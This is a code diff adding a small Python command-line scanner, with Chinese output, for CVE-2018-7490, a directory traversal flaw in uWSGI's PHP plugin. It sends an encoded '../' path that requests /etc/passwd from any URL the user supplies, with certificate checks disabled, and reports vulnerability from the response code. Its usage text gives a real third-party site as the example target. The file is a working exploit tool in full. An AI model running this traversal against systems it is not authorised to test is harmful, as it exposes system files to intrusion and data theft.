@@ -1,0 +1,27 @@
+import requests
+import argparse
+
+def uwsgi(url):
+    if "http" not in url:
+        print("输入错误，请输入正确网站")
+    else:
+        urls = url + "/..%2f..%2f..%2f..%2f..%2fetc/passwd"
+        header = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0"}
+        r = requests.get(url=urls, headers=header, verify=False)
+        if r.status_code == 200:
+            print(url+"中存在uWSGI PHP目录遍历漏洞,该漏洞编号为CVE-2018-7490")
+        elif r.status_code == 404 or r.status_code == 400:
+            print("不存在此漏洞")
+        elif r.status_code == 403:
+            print("uWSGI PHP目录遍历漏洞可能存在,但服务器拒绝此请求")
+        elif r.status_code == 301 or r.status_code == 302:
+            print("网页被重定向了")
+        else:
+            pass
+
+parser = argparse.ArgumentParser(usage='-u url 例:http://www.baidu.com',description='uWSGI PHP目录遍历漏洞扫描')
+parser.add_argument('-u','--url',type=str,help='扫描网站')
+args = parser.parse_args()
+url = args.url
+if __name__ == '__main__':
+    uwsgi(url)
